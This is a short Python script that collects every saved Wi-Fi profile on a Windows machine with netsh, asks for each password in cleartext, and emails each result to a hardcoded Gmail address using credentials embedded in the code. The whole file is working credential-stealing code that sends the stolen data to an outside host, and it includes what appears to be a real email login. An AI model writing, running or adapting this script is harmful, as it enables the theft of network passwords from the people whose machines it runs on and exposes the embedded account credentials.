#! /usr/bin/env python

import smtplib
import subprocess
import re

def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*?\\\\r)", str(networks))

for network_name in network_names_list:
	command = 'netsh wlan show profile name="' + network_name.rstrip('\\r') + '" key=clear'
	current_result = subprocess.check_output(command, shell=True)
	send_mail('akgautam97211@gmail.com', 'adepg91189&*#akg', current_result)
